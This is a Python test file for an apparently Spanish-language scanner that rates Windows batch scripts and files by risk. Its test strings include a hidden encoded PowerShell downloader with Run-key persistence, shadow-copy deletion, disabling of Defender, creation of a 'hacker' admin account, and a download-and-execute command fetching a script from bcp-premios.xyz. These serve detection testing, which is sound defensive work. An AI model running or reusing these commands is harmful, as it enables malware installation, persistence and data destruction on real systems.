"""Pruebas de la revisión de scripts y archivos."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from app import analisis_archivo as aa  # noqa: E402


def test_script_inofensivo_sale_tranquilo():
    r = aa.analizar_script("@echo off\r\necho Hola\r\ncopy informe.txt D:\\respaldo\\\r\npause\r\n")
    assert r["nivel"] == "tranquilo" and r["puntaje"] < 30


def test_descargador_oculto_con_powershell_codificado_es_peligro():
    r = aa.analizar_script(
        "@echo off\npowershell -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n"
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d c:\\x.exe\n")
    assert r["nivel"] == "peligro" and len(r["razones"]) >= 3


def test_ransomware_borra_copias_de_seguridad():
    r = aa.analizar_script("vssadmin delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled no\n")
    assert r["nivel"] == "peligro" and any("copias de seguridad" in x for x in r["razones"])


def test_apagar_antivirus_y_crear_admin():
    r = aa.analizar_script("powershell Set-MpPreference -DisableRealtimeMonitoring $true\nnet user hacker P4ss /add\n")
    assert r["nivel"] == "peligro"


def test_doble_extension_y_binarios(tmp_path):
    f = tmp_path / "factura.pdf.exe"
    f.write_bytes(b"MZ\x90\x00")
    r = aa.analizar_archivo(f)
    assert not r["revisable"] and r["riesgo"]["nivel"] == "peligro" and len(r["sha256"]) == 64


def test_analizar_un_bat_desde_archivo(tmp_path):
    f = tmp_path / "trabajo.bat"
    f.write_text("powershell -nop -w hidden -c \"iex (iwr http://bcp-premios.xyz/a.ps1)\"", encoding="utf-8")
    r = aa.analizar_archivo(f)
    assert r["revisable"] and r["tipo"] == "script" and r["riesgo"]["nivel"] in ("alerta", "peligro")


def test_leer_texto_y_rechazar_binario(tmp_path):
    t = tmp_path / "a.txt"
    t.write_text("hola mundo", encoding="utf-8")
    assert aa.leer(t)["texto"] == "hola mundo"
    b = tmp_path / "a.png"
    b.write_bytes(b"\x89PNG")
    assert not aa.leer(b)["legible"]
